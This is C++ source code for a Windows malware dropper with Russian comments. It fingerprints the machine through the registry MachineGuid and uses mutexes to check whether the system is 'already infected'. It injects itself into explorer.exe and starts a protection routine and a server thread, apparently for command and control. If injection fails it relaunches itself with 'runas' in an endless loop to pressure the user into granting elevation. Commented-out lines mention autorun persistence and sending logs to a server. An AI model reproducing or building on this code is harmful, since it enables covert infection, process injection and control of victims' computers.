#include <intrin.h>
#include <stdio.h>
#include <windows.h>
#include <psapi.h>
#include <shlwapi.h>
#include <shlobj.h>

#include "dropper.h"
#include "protect.h"
#include "server.h"
#include "inject.h"
#include "config.h"

#include "utils.h"
#include "peldr.h"

CHAR Drop::MachineGuid[MAX_PATH];
CHAR Drop::CurrentModulePath[MAX_PATH];
CHAR Drop::CurrentConfigPath[MAX_PATH];
PVOID Drop::CurrentImageBase;
DWORD Drop::CurrentImageSize;
BOOLEAN Drop::bFirstImageLoad;
BOOLEAN Drop::bWorkThread;

//----------------------------------------------------------------------------------------------------------------------------------------------------

PCHAR Drop::GetMachineGuid()
{
	if (!MachineGuid[0])
	{
		if (Utils::RegReadValue(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Cryptography", "MachineGuid", REG_SZ, MachineGuid, sizeof(MachineGuid)) != ERROR_SUCCESS)
		{
			lstrcpy(MachineGuid, DROP_MACHINEGUID);
		}
		lstrcat(MachineGuid, DROP_MACHINESIGN);
	}

	return MachineGuid;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

VOID Drop::CreateInjectStartThread()
{
	if (!bWorkThread)
	{
		bWorkThread = TRUE;
		Utils::ThreadCreate(Drop::InjectStartThread, NULL, NULL);
	}
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

DWORD Drop::InjectStartThread(PVOID Context)
{
	OutputDebugStringA("fsdsad");

	PCHAR CurrentProcess = PathFindFileName(Drop::CurrentModulePath);

	DbgMsg(__FUNCTION__"(): inject '%s' (x%s) !!!\n", CurrentProcess, RtlImageNtHeader(Drop::CurrentImageBase)->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64 ? "64" : "32");

	Config::ReadConfig();

	// Если мы эксплорер и это первый запуск наш в этой системе записываем себя в авторан и все дела
	if (!lstrcmpi(CurrentProcess, "explorer.exe") && Utils::CreateCheckMutex(DROP_EXP_MUTEX_ID, Drop::GetMachineGuid()))
	{	
		Protect::StartProtect();
		Utils::ThreadCreate(Server::ServerLoopThread, NULL, NULL);
	}

	return 0;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

VOID aRestartModuleShellExec(PCHAR FilePath)
{
	SHELLEXECUTEINFO sei = {0};
	CHAR TempPath[MAX_PATH];
	CHAR TempName[MAX_PATH];
	PVOID Buffer;
	DWORD Size;

	if (!StrStrI(FilePath, ".exe"))
	{
		Protect::GetStorageFolderPath(TempPath);
		GetTempFileName(TempPath, NULL, GetTickCount(), TempName);
		PathRemoveExtension(TempName);
		PathAddExtension(TempName, ".exe");

		if (Buffer = Utils::FileRead(FilePath, &Size))
		{
			if (Utils::FileWrite(TempName, CREATE_ALWAYS, Buffer, Size))
			{
				FilePath = TempName;
			}
		}
	}

	sei.cbSize = sizeof(sei);
	sei.lpFile = FilePath;
	sei.lpVerb = "runas";
	sei.hwnd = GetForegroundWindow();
	while (!ShellExecuteEx(&sei))
	{
		DbgMsg(__FUNCTION__"(): ShellExecuteEx error: %x\n", GetLastError());

		Sleep(3000);
	}
}


VOID Entry()
{
	OutputDebugStringA("abcdef");

#ifndef _WIN64

	HANDLE DropMutex;
	BOOLEAN bInject = FALSE;
	MEMORY_BASIC_INFORMATION Mbi;
	CHAR WinVer[MAX_PATH];

	GetModuleFileName(NULL, Drop::CurrentModulePath, RTL_NUMBER_OF(Drop::CurrentModulePath));
	VirtualQuery(Entry, &Mbi, sizeof(Mbi));
	Drop::CurrentImageBase = Mbi.AllocationBase;
	Drop::CurrentImageSize = PeLdr::PeImageNtHeader(Mbi.AllocationBase)->OptionalHeader.SizeOfImage;
	Drop::bFirstImageLoad = TRUE;

	Utils::GetWindowsVersion(WinVer, RTL_NUMBER_OF(WinVer));
	DWORD IntegrityLevel = Utils::GetProcessIntegrityLevel();

	DbgMsg(__FUNCTION__"(): integrity: %x, current: '%s', win: '%s', admin: '%d', uac: '%d', wow64: '%d'\n", IntegrityLevel, Drop::CurrentModulePath, WinVer, Utils::CheckAdmin(), Utils::CheckUAC(), Utils::IsWow64(NtCurrentProcess()));

	if (IntegrityLevel != SECURITY_MANDATORY_LOW_RID)
	{
		// Проверям основной мьютекс и мьютекс что бы два дроппера одновременно не запустились
		if (Utils::CheckMutex(DROP_EXP_MUTEX_ID, Drop::GetMachineGuid()) && (DropMutex = Utils::CreateCheckMutex(DROP_RUN_MUTEX_ID, Drop::GetMachineGuid())))
		{	
			Config::RegWriteString("CurrentPath", Drop::CurrentModulePath);

			{
				DbgMsg(__FUNCTION__"(): Exploit failed\n");

				bInject = Inject::InjectExplorerProcess();
				if (!bInject)
				{
					DbgMsg(__FUNCTION__"(): Normal injected failed\n");
				}
			}

			// Записываем в новую папку и добавляем в авторан в реестр
			// Protect::WriteFileToNewPath(Drop::CurrentModulePath, NewFileName);
			// Protect::AddKeyToRun(NewFileName);

			CloseHandle(DropMutex);
		}
		else
		{
			DbgMsg(__FUNCTION__"(): System already infected\n");
			bInject = TRUE;
		}
	}
	// Если инжект не прошел или траблы с IntegrityLevel перезапускаем себя и отправляем логи на сервер
	if (!bInject)
	{
		aRestartModuleShellExec(Drop::CurrentModulePath);
		//Server::SendLogsToServer();
	}
	
#endif

	ExitProcess(ERROR_SUCCESS);
}
